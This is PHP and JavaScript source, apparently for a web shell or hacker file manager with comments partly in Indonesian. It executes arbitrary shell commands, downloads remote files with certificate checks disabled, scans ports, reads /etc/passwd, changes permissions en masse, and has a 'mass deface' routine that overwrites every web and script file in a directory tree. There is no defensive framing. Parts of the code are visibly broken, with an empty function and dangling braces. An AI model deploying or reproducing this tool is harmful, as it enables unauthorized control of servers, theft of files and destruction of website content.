// ====================== FUNGSI DOWNLOAD ======================
function downloadFile($url, $custom_name = '', $target_dir = '') {
    if (empty($target_dir)) {
        global $current_dir;
        $target_dir = $current_dir;
    }
    
    $filename = $custom_name ?: basename(parse_url($url, PHP_URL_PATH));
    if (empty($filename)) $filename = 'downloaded_' . time() . '.file';
    $filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);
    
    $filepath = $target_dir . '/' . $filename;
    
    if (!is_dir($target_dir)) {
        return ["success" => false, "error" => "Target directory not found: " . $target_dir];
    }
    
    if (!is_writable($target_dir)) {
        return ["success" => false, "error" => "Target directory not writable: " . $target_dir];
    }
    
    $content = @file_get_contents($url);
    if ($content !== false && !empty($content)) {
        if (file_put_contents($filepath, $content) !== false) {
            @chmod($filepath, 0644);
            return ["success" => true, "filename" => $filename, "size" => filesize($filepath), "path" => $filepath];
        }
    }
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 120);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        $content = curl_exec($ch);
        curl_close($ch);
        
        if ($content !== false && !empty($content)) {
            if (file_put_contents($filepath, $content) !== false) {
                @chmod($filepath, 0644);
                return ["success" => true, "filename" => $filename, "size" => filesize($filepath), "path" => $filepath];
            }
        }
    }
    
    return ["success" => false, "error" => "Download failed!"];
}

// ====================== FUNGSI UNZIP ======================
function extractZip($zip_file, $destination) {
    if (empty($destination)) {
        global $current_dir;
        $destination = $current_dir;
    }
    
    if (!class_exists('ZipArchive')) {
        return ["success" => false, "error" => "ZipArchive class not available!"];
    }
    
    if (!file_exists($zip_file)) {
        return ["success" => false, "error" => "File not found: " . basename($zip_file)];
    }
    
    $zip = new ZipArchive();
    if ($zip->open($zip_file) !== true) {
        return ["success" => false, "error" => "Cannot open zip file!"];
    }
    
    if ($zip->extractTo($destination)) {
        $zip->close();
        return ["success" => true, "message" => "Extracted successfully!", "destination" => $destination];
    }
    
    $zip->close();
    return ["success" => false, "error" => "Extract failed!"];
}

// ====================== FUNGSI PHP NATIVE ======================
function runCommand($cmd) {
    $output = '';
    if (function_exists('shell_exec')) {
        $out = shell_exec($cmd . ' 2>&1');
        if ($out !== null && $out !== false && $out !== '') return $out;
    }
    if (function_exists('exec')) {
        $out = [];
        exec($cmd . ' 2>&1', $out);
        if (!empty($out)) return implode("\n", $out);
    }
    if (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $out = ob_get_clean();
        if (!empty($out)) return $out;
    }
    return false;
}

function getProcessListPHP() {
    $output = "=== PROCESS LIST ===\n\n";
    $output .= "PID\t\tMemory Usage\t\tProcess\n";
    $output .= str_repeat("-", 60) . "\n";
    $output .= getmypid() . "\t\t" . number_format(memory_get_usage()) . " bytes\t\tCurrent PHP Process\n";
    $output .= "N/A\t\t" . number_format(memory_get_peak_usage()) . " bytes\t\tPeak Memory Usage\n";
    
    if (is_dir('/proc')) {
        $output .= "\n--- Processes from /proc ---\n";
        $pids = scandir('/proc');
        $count = 0;
        foreach ($pids as $pid) {
            if (is_numeric($pid) && $count < 30) {
                $cmdline_file = "/proc/$pid/cmdline";
                if (file_exists($cmdline_file)) {
                    $cmdline = file_get_contents($cmdline_file);
                    $cmdline = str_replace("\0", " ", $cmdline);
                    if (strlen(trim($cmdline)) > 0) {
                        $output .= "$pid\t\t-\t\t" . htmlspecialchars(substr($cmdline, 0, 60)) . "\n";
                        $count++;
                    }
                }
            }
        }
    }
    return $output;
}

function getDiskInfoPHP() {
    $output = "=== DISK INFORMATION ===\n\n";
    $output .= "Filesystem\t\tSize\t\tUsed\t\tAvailable\tUse%\n";
    $output .= str_repeat("-", 80) . "\n";
    
    $total = disk_total_space('/');
    $free = disk_free_space('/');
    $used = $total - $free;
    $used_percent = round(($used / $total) * 100);
    $output .= "/\t\t\t" . formatBytes($total) . "\t" . formatBytes($used) . "\t" . formatBytes($free) . "\t" . $used_percent . "%\n";
    return $output;
}

function getMemoryInfoPHP() {
    $output = "=== MEMORY INFORMATION ===\n\n";
    $output .= "PHP Memory Limit: " . ini_get('memory_limit') . "\n";
    $output .= "Current Memory Usage: " . formatBytes(memory_get_usage()) . "\n";
    $output .= "Peak Memory Usage: " . formatBytes(memory_get_peak_usage()) . "\n";
    
    if (file_exists('/proc/meminfo')) {
        $output .= "\n--- System Memory ---\n";
        $meminfo = file_get_contents('/proc/meminfo');
        $lines = explode("\n", $meminfo);
        foreach ($lines as $line) {
            if (strpos($line, 'MemTotal:') !== false) $output .= $line . "\n";
            if (strpos($line, 'MemFree:') !== false) $output .= $line . "\n";
            if (strpos($line, 'MemAvailable:') !== false) $output .= $line . "\n";
            if (strpos($line, 'SwapTotal:') !== false) $output .= $line . "\n";
            if (strpos($line, 'SwapFree:') !== false) $output .= $line . "\n";
        }
    }
    return $output;
}

function formatBytes($bytes) {
    if ($bytes === false || $bytes === null) return '?';
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
    return round($bytes, 2) . ' ' . $units[$i];
}

function getDirectoryListingPHP() {
    $dir = getcwd();
    $output = "=== DIRECTORY LISTING: $dir ===\n\n";
    $output .= "Type\tPermissions\tSize\t\tModified\t\tName\n";
    $output .= str_repeat("-", 100) . "\n";
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $full = $dir . '/' . $item;
        $isDir = is_dir($full);
        $type = $isDir ? "DIR" : "FILE";
        $perms = getPermsStr($full);
        $size = $isDir ? "-" : formatBytes(@filesize($full));
        $modified = date("Y-m-d H:i:s", @filemtime($full));
        $output .= sprintf("%-4s\t%s\t%-12s\t%s\t%s\n", $type, $perms, $size, $modified, $item);
    }
    return $output;
}

function getPermsStr($path) {
    $p = @fileperms($path);
    if ($p === false) return '????';
    $info = is_dir($path) ? 'd' : '-';
    $info .= ($p & 0x0100) ? 'r' : '-';
    $info .= ($p & 0x0080) ? 'w' : '-';
    $info .= ($p & 0x0040) ? 'x' : '-';
    $info .= ($p & 0x0020) ? 'r' : '-';
    $info .= ($p & 0x0010) ? 'w' : '-';
    $info .= ($p & 0x0008) ? 'x' : '-';
    $info .= ($p & 0x0004) ? 'r' : '-';
    $info .= ($p & 0x0002) ? 'w' : '-';
    $info .= ($p & 0x0001) ? 'x' : '-';
    return $info;
}

function getPermNumber($path) {

}

function portScan($host, $ports) {
    $open_ports = [];
    foreach ($ports as $port) {
        $sock = @fsockopen($host, $port, $errno, $errstr, 1);
        if ($sock) {
            $open_ports[] = $port;
            @fclose($sock);
        }
    }
    return $open_ports;
}

function getUserList() {
    $output = "=== USER LIST ON SERVER ===\n\n";
    $output .= "UID\tUsername\t\tHome Directory\t\tShell\n";
    $output .= str_repeat("-", 80) . "\n";
    
    if (file_exists('/etc/passwd') && is_readable('/etc/passwd')) {

            }
        }
    } else {
        $output .= "Cannot read /etc/passwd file!\n";
    }
    return $output;
}

// ====================== MASS CHMOD ======================
function massChmodAllFiles($dir, $permission, $recursive) {
    $count = 0;
    $errors = [];
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullpath = $dir . '/' . $item;
        
        if (is_dir($fullpath)) {
            if ($recursive) {
                $result = massChmodAllFiles($fullpath, $permission, true);
                $count += $result['count'];
                $errors = array_merge($errors, $result['errors']);
            }
            continue;
        }
        
        if (@chmod($fullpath, octdec($permission))) {
            $count++;
        } else {
            $errors[] = $fullpath;
        }
    }
    return ['count' => $count, 'errors' => $errors];
}

// ====================== MASS DEFACE ======================
function massDefaceAllFiles($dir, $content, $recursive) {
    $count = 0;
    $errors = [];
    $extensions = ['php', 'html', 'htm', 'txt', 'js', 'css', 'xml', 'json', 'sql', 'py', 'sh', 'cgi', 'pl'];
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $fullpath = $dir . '/' . $item;
        
        if (is_dir($fullpath)) {
            if ($recursive) {
                $result = massDefaceAllFiles($fullpath, $content, true);
                $count += $result['count'];
                $errors = array_merge($errors, $result['errors']);
            }
            continue;
        }
        
        $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
        if (in_array($ext, $extensions)) {
            if (file_put_contents($fullpath, $content) !== false) {
                $count++;
            } else {
                $errors[] = $fullpath;
            }
        }
    }
    return ['count' => $count, 'errors' => $errors];
}

// ====================== COMMAND DISPATCHER ======================
function executeCommand($cmd) {
    global $current_dir;
    $cmd_lower = strtolower(trim($cmd));
    
    if (preg_match('/^wget\s+(https?:\/\/[^\s]+)(?:\s+([^\s]+))?$/i', $cmd, $matches)) {
        $url = trim($matches[1]);
        $custom_name = isset($matches[2]) ? trim($matches[2]) : '';
        $result = downloadFile($url, $custom_name, $current_dir);
        if ($result['success']) {
            return "✅ Download success!\nFile: " . $result['filename'] . "\nSize: " . formatBytes($result['size']) . "\nLocation: " . $result['path'];
        } else {
            return "❌ Download failed: " . $result['error'];
        }
    }
    
    if (preg_match('/^unzip\s+([^\s]+)$/i', $cmd, $matches)) {
        $zip_file = $matches[1];
        $full_zip_path = $current_dir . '/' . $zip_file;
        
        if (file_exists($full_zip_path)) {
            $result = extractZip($full_zip_path, $current_dir);
            if ($result['success']) {
                return "✅ Unzip success: " . $zip_file . "\nExtracted to: " . $result['destination'];
            } else {
                return "❌ Unzip failed: " . $result['error'];
            }
        } else {
            return "❌ File not found: " . $zip_file;
        }
    }
    
    $native_commands = [
        'ps aux' => 'getProcessListPHP', 'ps' => 'getProcessListPHP',
        'netstat' => 'getNetworkInfoPHP', 'netstat -tulnp' => 'getNetworkInfoPHP',
        'ifconfig' => 'getInterfaceInfoPHP', 'ip a' => 'getInterfaceInfoPHP',
        'df -h' => 'getDiskInfoPHP', 'df' => 'getDiskInfoPHP',
        'free -m' => 'getMemoryInfoPHP', 'free' => 'getMemoryInfoPHP',
    ];
    
    foreach ($native_commands as $key => $func) {
        if ($cmd_lower == $key || strpos($cmd_lower, $key) === 0) {
            return $func();
        }
    }
    
    $result = runCommand($cmd);
    if ($result !== false) return $result;
    
    if ($cmd_lower == 'ls' || $cmd_lower == 'ls -la' || $cmd_lower == 'dir') return getDirectoryListingPHP();
    elseif ($cmd_lower == 'pwd' || $cmd_lower == 'cwd') return "Current Directory: " . $current_dir;
    elseif ($cmd_lower == 'whoami') return "PHP User: " . get_current_user() . "\nUID: " . getmyuid() . "\nGID: " . getmygid();
    elseif ($cmd_lower == 'id') return "uid=" . getmyuid() . "(" . get_current_user() . ") gid=" . getmygid() . "(" . get_current_user() . ")";
    elseif ($cmd_lower == 'uname' || $cmd_lower == 'uname -a') return "System: " . php_uname() . "\nPHP Version: " . phpversion();
    elseif (strpos($cmd_lower, 'cat ') === 0) {
        $file = substr($cmd, 4);
        $full_path = $current_dir . '/' . $file;
        if (file_exists($full_path) && is_readable($full_path)) return file_get_contents($full_path);
        return "Cannot read file: $file";
    }
    
    return "Command '$cmd' tidak tersedia.\n\nCommands: ls, pwd, whoami, id, uname, ps aux, netstat, ifconfig, df -h, free -m, wget [URL], unzip [file.zip], cat [file]";
}

<script>
function setCmd(cmd) {
    document.getElementById('cmd_input').value = cmd;
    document.getElementById('cmd_input').form.submit();
}

function setScanPorts(ports) {
    let inputs = document.querySelectorAll('input[name="scan_ports"]');
    if (inputs.length) inputs[inputs.length-1].value = ports;
}

function toggleSection(id) {
    let el = document.getElementById(id);
    if (el.style.display === 'none') el.style.display = 'block';
    else el.style.display = 'none';
}

function showModal(id) {
    document.getElementById(id).style.display = 'flex';
}

function closeModal(id) {
    document.getElementById(id).style.display = 'none';
}

function showRenameModal(oldName) {
    document.getElementById('renameOld').value = oldName;
    document.getElementById('renameNew').value = oldName;
    showModal('renameModal');
}

function showChmodModal(fileName, currentPerm) {
    document.getElementById('chmodFile').value = fileName;
    document.getElementById('chmodPerm').value = currentPerm || '755';
    showModal('chmodModal');
}

function showTouchModal(fileName, currentDate) {
    document.getElementById('touchFile').value = fileName;
    let date = currentDate.replace(' ', 'T');
    if (date.length > 16) date = date.substring(0, 16);
    document.getElementById('touchDateTime').value = date;
    showModal('touchModal');
}

function unzipFile(filename) {
    document.querySelector('input[name="unzip_file"]').value = filename;
    showModal('unzipModal');
}

function editFile(filename) {
    document.getElementById('editFileName').innerText = filename;
    document.getElementById('editContent').value = 'Loading...';
    showModal('editModal');
    
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '?q=load&f=' + encodeURIComponent(filename) + '&dir=<?php echo $dir_url; ?>', true);
    xhr.onload = function() {
        if (xhr.status === 200) {
            document.getElementById('editContent').value = xhr.responseText;
        } else {
            document.getElementById('editContent').value = 'Error loading file content!';
        }
    };
    xhr.send();
}

function saveEdit() {
    var filename = document.getElementById('editFileName').innerText;
    var content = document.getElementById('editContent').value;
    
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '?dir=<?php echo $dir_url; ?>', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onload = function() {
        if (xhr.status === 200 && xhr.responseText === 'saved') {
            alert('✅ File saved successfully!');
            location.reload();
        } else {
            alert('❌ Save failed!');
        }
    };
    xhr.send('a=save&f=' + encodeURIComponent(filename) + '&c=' + encodeURIComponent(content));
}

window.onclick = function(e) {
    if (e.target.classList && e.target.classList.contains('modal')) {
        e.target.style.display = 'none';
    }
}
